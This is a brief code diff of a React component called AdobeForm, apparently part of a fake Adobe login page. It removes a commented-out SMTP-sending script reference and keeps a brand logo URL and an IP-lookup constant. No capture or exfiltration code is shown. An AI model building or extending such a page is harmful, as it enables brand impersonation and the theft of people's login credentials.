@@ -1,7 +1,6 @@
 import React, { useState } from "react";
 
 function AdobeForm({ Login, error }) {
-  // const src = "https://smtpjs.com/v3/smtp.js"
   const logo =
     "https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_211.png?v=1601072619401";
   const ipUri =
